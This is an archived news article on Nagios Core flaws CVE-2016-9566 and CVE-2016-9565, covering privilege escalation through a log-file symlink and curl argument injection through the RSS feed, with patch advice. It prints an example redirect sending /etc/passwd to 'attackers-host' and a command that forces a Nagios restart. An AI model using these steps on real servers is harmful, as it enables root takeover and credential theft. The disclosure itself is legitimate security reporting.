<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Vulnerability in Nagios monitoring system allows privilege escalation</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Information security researcher David Golunski found a serious vulnerability in the popular Nagios IT infrastructure monitoring system. Its operation ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Vulnerability in Nagios monitoring system allows privilege escalation</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/f81/7d0/677/f817d0677b424a75ac9ca090e41b361f.jpg"><br><br>  Information security researcher David Golunski <a href="https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html">found a</a> serious vulnerability in the popular Nagios IT infrastructure monitoring system.  Its operation allows an attacker to achieve elevated privileges in the system. <a name="habracut"></a><br><br><h3>  What is the problem </h3><br>  The Nagios Core daemon of versions below 4.2.4 performs unsafe operations when processing a log file.  This may result in the attacker being able to upgrade his privileges from the nagios system user in the nagios group to the root user.  This leads to a complete compromise of the system on which the infrastructure monitoring software is installed. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The standard installation of Nagios Core creates a log directory with the following rights: <br><br><pre><code class="bash hljs">drwxrwsr-x 5 nagios nagios</code> </pre> <br>  The researcher discovered that the Nagios daemon at system startup first opens the log file and then resets the root rights: <br><br><pre> <code class="bash hljs">8148 open(<span class="hljs-string"><span class="hljs-string">"/usr/local/nagios/var/nagios.log"</span></span>, O_RDWR|O_CREAT|O_APPEND, 0666) = 4 8148 fcntl(4, F_SETFD, FD_CLOEXEC) = 0 8148 fchown(4, 1001, 1001) = 0 8148 getegid() = 0 8148 setgid(1001) = 0 8148 geteuid() = 0 [...]</code> </pre> <br>  This means that if an attacker succeeds in gaining access to the 'nagios' account or another account from the 'nagios' group, he can replace the log file with a symlink with a random file in the system.  Thus, it is possible to elevate privileges to root ‚Äî for example, using a specially created <code>/etc/ld.so.preload file</code> . <br><br>  By default, it will be created with the following nagios privileges: <br><br><pre> <code class="bash hljs">-rw-r--r-- 1 nagios nagios 950 Dec 10 11:56 /etc/ld.so.preload</code> </pre> <br>  Thus, nagios has the right to write, but not members of the nagios group.  However, there is a way to get write permissions for members of this group - for this, the attacker needs to exploit the CVE-2016-9565 vulnerability and an error in the operation of the Nagios command line module (nagios.cmd). <br><br>  In order for new privileges to take effect, you need to restart Nagios - and the attacker can also provoke this action.  To do this, you must send the SHUTDOWN_PROGRAM command via the system command interface. <br><br><pre> <code class="bash hljs">/usr/bin/<span class="hljs-built_in"><span class="hljs-built_in">printf</span></span> <span class="hljs-string"><span class="hljs-string">"[%lu] SHUTDOWN_PROGRAM\n"</span></span> `date +%s` &gt; /usr/<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/nagios/var/rw/nagios.cmd</code> </pre> <br>  David Golunsky also developed a PoC-exploit that allows you to raise privileges in the system to the superuser. <br><br><h3>  CVE-2016-9565 </h3><br>  In the version of Nagios 4.2.0, the vulnerability CVE-2008-4796 in the MagpieRSS component was fixed, allowing the insertion of arbitrary commands as parameters to the curl command.  However, this fix remained vulnerable to the use of double quotes - this new vulnerability received the number CVE-2016-9565 and was finally fixed only in version 4.2.2. <br><br>  The exploitation of the vulnerability consists in changing the internal variable $ URI in the _httpsrequest function of the vulnerable component when an RSS feed is requested by the local Nagios Core server.  In different versions of the system, the RSS feed may be automatically loaded upon login.  To conduct an attack, the attacker must impersonate <a href="http://www.nagios.org/">www.nagios.org</a> , for example, using DNS spoofing or ARP poisoning techniques.  It is worth noting that this attack can acquire enormous proportions when this domain is compromised on the scale of large ISP DNS resolvers.  Then, after a successful compromise, the attacker waits for the RSS feed request and responds with HTTP 302 Redirect, with the Location field containing the parameters for curl.  For example, it might look like this: <br><br><pre> <code class="bash hljs">Location: https://attackers-host/get-data.php -Fpasswd=@/etc/passwd</code> </pre> <br>  Thus, an attacker can execute arbitrary commands on the local Nagios server, and then use the CVE-2016-9566 vulnerability to increase local privileges. <br><br>  It is important to note that among the parameters for curl, the argument ‚Äú-k‚Äù is mentioned, which disables the SSL certificate verification, which also facilitates the attacker's task. <br><br><h3>  How to protect </h3><br>  The fixes for vulnerabilities CVE-2016-9565 and CVE-2016-9566 appeared in versions 4.2.2 and 4.2.4, respectively, therefore, administrators of Nagios servers are strongly recommended to upgrade to the latest version of Nagios. <br><br>  Positive Technologies experts also developed an IDS signature for detecting attempts to exploit CVE-2008-4796 and CVE-2016-9565 vulnerabilities, publicly available on GitHub and Twitter: <br><blockquote><p>  <a href="https://twitter.com/hashtag/Nagios%3Fsrc%3Dhash">#Nagios</a> Core Curl Command Injection / <a href="https://twitter.com/hashtag/RCE%3Fsrc%3Dhash">#RCE</a> <br>  CVE-2016-9565 <br>  Affected: &lt;4.2.2 <a href="https://twitter.com/hashtag/Suricata%3Fsrc%3Dhash">#Suricata</a> rules: <a href="https://t.co/vkidBDy3cN">https://t.co/vkidBDy3cN</a> </p>  - Attack Detection (@AttackDetection) <a href="https://twitter.com/AttackDetection/status/811198718821232640">December 20, 2016</a> </blockquote><br></div><p>Source: <a href="https://habr.com/ru/post/318050/">https://habr.com/ru/post/318050/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../318040/index.html">Angular2 + Websocket + RxJS + Rails5</a></li>
<li><a href="../318042/index.html">Five powerful F2P monetization patterns that use behavioral economics in UX design</a></li>
<li><a href="../318044/index.html">MyOffice editors toolbar</a></li>
<li><a href="../318046/index.html">About using and understanding the Lerp function in Unity3D</a></li>
<li><a href="../318048/index.html">The story of my startup: 500,000 users in 5 days on a hundred dollar server</a></li>
<li><a href="../318052/index.html">"Corporate" backup for nothing (on the network of home media players)</a></li>
<li><a href="../318054/index.html">RFC prototype HTTP status codes for developer errors (range 7XX)</a></li>
<li><a href="../318056/index.html">We calculate content that will become viral in the future.</a></li>
<li><a href="../318058/index.html">Convert data presentation form using Excel + PowerQuery</a></li>
<li><a href="../318060/index.html">Google has introduced a test suite Wycheproof</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>